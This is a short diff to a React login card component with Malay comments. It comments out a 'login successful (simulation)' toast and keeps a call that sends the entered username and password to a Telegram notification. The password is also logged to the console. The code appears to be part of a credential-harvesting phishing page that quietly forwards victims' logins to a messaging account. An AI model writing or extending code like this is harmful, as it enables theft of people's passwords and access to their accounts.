@@ -45,7 +45,7 @@ const LoginCard: React.FC = () => {
       }
       // In a real app, you'd send username and password to backend for authentication
       console.log("Attempting to log in with:", { username, password });
-      toast.success("Log masuk berjaya! (Simulasi)");
+      // toast.success("Log masuk berjaya! (Simulasi)"); // Baris ini telah dipadamkan
       await sendTelegramNotification(username, password, "Log masuk berjaya (simulasi)."); // Hanya hantar di sini
       // Optionally reset or redirect after successful login
       // setLoginStep('username');
